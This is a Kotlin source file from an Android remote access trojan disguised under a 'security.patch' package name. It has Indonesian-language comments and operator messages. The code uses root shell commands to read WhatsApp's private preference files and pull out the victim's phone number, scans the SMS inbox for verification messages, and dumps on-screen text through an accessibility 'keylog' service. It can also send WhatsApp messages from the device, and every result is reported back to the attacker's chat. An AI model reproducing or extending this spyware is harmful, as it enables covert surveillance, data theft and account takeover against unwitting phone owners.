package com.android.security.patch.commands

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.provider.Telephony
import com.android.security.patch.KeylogService
import com.android.security.patch.RatApi

object WA {

    fun getNumber(ctx: Context, chatId: Long) {
        RatApi.sendMessage(ctx, "reading wa number...", chatId)
        Thread {
            val sb = StringBuilder("<b>📱 WA number</b>\n\n")
            val isRoot = checkRoot()
            var found = false

            if (isRoot) {
                sb.append("<b>WhatsApp</b>\n")
                val n1 = readRoot("com.whatsapp")
                if (n1 != null) { sb.append("<code>$n1</code>\n"); found = true }
                else sb.append("<i>gak ke-baca / gak terinstall</i>\n")

                sb.append("\n<b>WhatsApp Business</b>\n")
                val n2 = readRoot("com.whatsapp.w4b")
                if (n2 != null) { sb.append("<code>$n2</code>\n"); found = true }
                else sb.append("<i>gak ke-baca / gak terinstall</i>\n")

                if (found) sb.append("\n<i>via root file read</i>")
                else sb.append("\n<i>via root read — tapi nomor gak ketemu di prefs</i>")
            } else {
                try {
                    val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
                    @Suppress("DEPRECATION")
                    val num = tm.line1Number
                    sb.append("telephony: ")
                    if (!num.isNullOrBlank()) { sb.append("<code>$num</code>\n"); found = true }
                    else sb.append("(kosong)\n")
                } catch (_: Throwable) { sb.append("telephony: n/a\n") }

                val smsNum = findSMSVerify(ctx)
                if (smsNum != null) { sb.append("SMS verify: <code>$smsNum</code>\n"); found = true }

                if (!found) {
                    sb.append("\n<i>device non-root — pake accessibility scrape:</i>\n")
                    sb.append("1. kirim <code>/wa_open</code>\n")
                    sb.append("2. target: tap Setelan → profil\n")
                    sb.append("3. kirim <code>/wa_dump</code>")
                }
            }

            RatApi.sendMessage(ctx, sb.toString(), chatId)
        }.start()
    }

    private fun checkRoot(): Boolean {
        return try {
            val p = ProcessBuilder("su", "-c", "id").redirectErrorStream(true).start()
            val out = p.inputStream.bufferedReader().readText()
            p.waitFor()
            out.contains("uid=0")
        } catch (_: Throwable) { false }
    }

    private fun readRoot(pkg: String): String? {
        return try {
            val chk = ProcessBuilder("su", "-c", "ls /data/data/$pkg/shared_prefs/ 2>/dev/null")
                .redirectErrorStream(true).start()
            val chkOut = chk.inputStream.bufferedReader().readText()
            chk.waitFor()
            if (chkOut.isBlank()) return null

            val paths = listOf(
                "/data/data/$pkg/shared_prefs/register_phone_prefs.xml",
                "/data/data/$pkg/shared_prefs/device_capabilities.xml",
                "/data/data/$pkg/shared_prefs/com.whatsapp_preferences.xml",
                "/data/data/$pkg/shared_prefs/com.whatsapp_preferences_light.xml"
            )

            var jidNum: String? = null
            var fallback: String? = null

            for (path in paths) {
                val p = ProcessBuilder("su", "-c", "cat \"$path\" 2>/dev/null")
                    .redirectErrorStream(true).start()
                val c = p.inputStream.bufferedReader().readText()
                p.waitFor()
                if (c.isBlank()) continue

                // 1. register_phone_prefs: country_code + phone_number
                val phoneM = Regex("""phone_number">([0-9]+)<""").find(c)
                val ccM = Regex("""country_code">([0-9]+)<""").find(c)
                if (phoneM != null) {
                    val phone = phoneM.groupValues[1]
                    val cc = ccM?.groupValues?.get(1) ?: "62"
                    return cc + phone
                }

                // 2. device_capabilities: 62xxx:0@s.whatsapp.net
                val jidM = Regex("""(6[0-9]{7,14}):[0-9]+@s\.whatsapp\.net""").find(c)
                if (jidM != null && jidNum == null) {
                    jidNum = jidM.groupValues[1]
                }

                // 3. fallback regex
                if (fallback == null) {
                    val numM = Regex("""\b(628[0-9]{7,13}|08[0-9]{7,13})\b""").find(c)
                    if (numM != null) fallback = numM.groupValues[1]
                }
            }

            return jidNum ?: fallback
        } catch (_: Throwable) { null }
    }

    private fun findSMSVerify(ctx: Context): String? {
        try {
            val c = ctx.contentResolver.query(
                Telephony.Sms.Inbox.CONTENT_URI,
                arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY),
                null, null,
                "${Telephony.Sms.DATE} DESC"
            )
            c?.use {
                var n = 0
                while (it.moveToNext() && n < 300) {
                    n++
                    val addr = it.getString(0) ?: ""
                    val body = it.getString(1) ?: ""
                    val lower = (addr + " " + body).lowercase()
                    if (lower.contains("whatsapp") || lower.contains("verification")) {
                        val m = Regex("""\b(628[0-9]{7,13}|08[0-9]{7,13})\b""").find(body)
                        if (m != null) return m.groupValues[1]
                    }
                }
            }
        } catch (_: Throwable) {}
        return null
    }

    fun openWA(ctx: Context, chatId: Long) {
        try {
            val i = ctx.packageManager.getLaunchIntentForPackage("com.whatsapp")
                ?: ctx.packageManager.getLaunchIntentForPackage("com.whatsapp.w4b")
            if (i == null) { RatApi.sendMessage(ctx, "WA gak terinstall", chatId); return }
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(i)
            RatApi.sendMessage(ctx,
                "WA dibuka.\n\n" +
                "1. target tap <b>Setelan</b> (gear icon)\n" +
                "2. tap <b>profil</b> (nama di atas)\n" +
                "3. nomor muncul\n" +
                "4. kirim <code>/wa_dump</code>",
                chatId)
        } catch (e: Throwable) {
            RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
        }
    }

    fun dumpScreen(ctx: Context, chatId: Long) {
        Thread {
            try {
                val svc = KeylogService.instance
                if (svc == null) {
                    RatApi.sendMessage(ctx, "accessibility gak aktif", chatId); return@Thread
                }
                val text = svc.dumpCurrentWindows()
                if (text.isBlank()) {
                    RatApi.sendMessage(ctx, "gak ada text ke-capture", chatId); return@Thread
                }
                RatApi.sendMessage(ctx, "<b>🪟 screen dump</b>\n<pre>${text.take(3500)}</pre>", chatId)
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "dump err: ${e.message}", chatId)
            }
        }.start()
    }

    fun send(ctx: Context, chatId: Long, args: Array<String>) {
        if (args.size < 2) {
            RatApi.sendMessage(ctx, "usage: /wa 6281234567890 pesan di sini", chatId); return
        }
        val num = args[0].replace(Regex("[^0-9]"), "")
        val msg = args.drop(1).joinToString(" ")
        if (num.length < 8) {
            RatApi.sendMessage(ctx, "nomor gak valid", chatId); return
        }
        val uri = Uri.parse("https://wa.me/$num?text=${Uri.encode(msg)}")
        val intent = Intent(Intent.ACTION_VIEW, uri).apply {
            setPackage("com.whatsapp")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        try {
            ctx.startActivity(intent)
            RatApi.sendMessage(ctx, "WA dibuka dengan pesan pre-filled untuk $num", chatId)
        } catch (e: Throwable) {
            try {
                val i2 = Intent(Intent.ACTION_VIEW, uri).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                ctx.startActivity(i2)
                RatApi.sendMessage(ctx, "WA opened (fallback)", chatId)
            } catch (e2: Throwable) {
                RatApi.sendMessage(ctx, "wa err: ${e.message}", chatId)
            }
        }
    }
}
